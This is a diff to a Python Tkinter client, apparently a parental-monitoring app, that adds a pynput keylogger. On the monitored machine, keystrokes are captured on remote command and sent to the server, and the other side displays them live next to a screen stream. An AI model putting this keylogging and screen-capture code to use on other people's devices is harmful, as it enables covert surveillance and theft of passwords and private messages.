@@ -9,6 +9,8 @@ from PIL import Image, ImageTk
 import pyautogui
 from encrypt import Encryption
 from constants import IP, PORT
+from pynput import keyboard 
+from tkinter import scrolledtext
 
 class Client:
     def __init__(self):
@@ -43,6 +45,8 @@ class ClientGUI:
         # משתני סטטוס
         self.is_streaming = False
         self.screen_label = None
+        self.key_listener = None
+
         
         self.build_login_screen()
 
@@ -147,6 +151,21 @@ class ClientGUI:
             elif cmd == "SCREEN_DATA":
                 self.display_frame(parts[1])
 
+            # פקודות ה-Keylogger החדשות:
+            elif cmd == "KEYLOG_START":
+                self.toggle_keylogger(True)
+            elif cmd == "KEYLOG_STOP":
+                self.toggle_keylogger(False)
+            elif cmd == "KEYLOG_DATA":
+                self.update_log_display(parts[1])
+
+    def update_log_display(self, text):
+        if hasattr(self, 'log_display'):
+            self.log_display.config(state='normal')
+            self.log_display.insert(tk.END, text)
+            self.log_display.see(tk.END) # גלילה אוטומטית לסוף
+            self.log_display.config(state='disabled')
+
     def stream_screen_loop(self):
         while self.is_streaming:
             shot = pyautogui.screenshot()
@@ -179,6 +198,21 @@ class ClientGUI:
         self.screen_label = tk.Label(self.root, bg="gray", highlightbackground="green", highlightthickness=10)
         self.screen_label.pack(pady=20)
 
+        key_frame = tk.LabelFrame(self.root, text=" Keyboard Monitoring ", padx=10, pady=10)
+        key_frame.pack(pady=10, padx=10, fill="x")
+        
+        tk.Button(key_frame, text="Start Logging", command=lambda: self.client.send("FORWARD|KEYLOG_START"), bg="lightblue", width=20).pack(side=tk.LEFT, padx=5)
+        tk.Button(key_frame, text="Stop Logging", command=lambda: self.client.send("FORWARD|KEYLOG_STOP"), bg="orange", width=20).pack(side=tk.LEFT, padx=5)
+
+        # תיבת טקסט גדולה להצגת ההקשות (ScrolledText)
+        tk.Label(self.root, text="Live Key Logs:").pack(anchor="w", padx=10)
+        self.log_display = scrolledtext.ScrolledText(self.root, height=8, state='disabled', bg="#f0f0f0")
+        self.log_display.pack(pady=5, padx=10, fill="both")
+        
+        # תצוגת המסך (Label)
+        self.screen_label = tk.Label(self.root, bg="gray", highlightbackground="green", highlightthickness=5)
+        self.screen_label.pack(pady=10)
+
     def start_stream_req(self):
         self.client.send("FORWARD|SCREEN_START")
 
@@ -193,6 +227,24 @@ class ClientGUI:
         self.clear_screen()
         tk.Label(self.root, text="Child Mode Active", font=("Arial", 16), fg="green").pack(pady=50)
         tk.Label(self.root, text="Monitoring is running in background...").pack()
+
+    def on_press(self, key):
+        try:
+            k = str(key.char)
+        except AttributeError:
+            k = f" [{str(key)}] " # עבור מקשים כמו Space, Enter וכו'
+        
+        self.client.send(f"FORWARD|KEYLOG_DATA|{k}")
+    
+    def toggle_keylogger(self, start):
+        if start:
+            if self.key_listener is None:
+                self.key_listener = keyboard.Listener(on_press=self.on_press)
+                self.key_listener.start()
+        else:
+            if self.key_listener:
+                self.key_listener.stop()
+                self.key_listener = None
 
 if __name__ == "__main__":
     gui = ClientGUI()
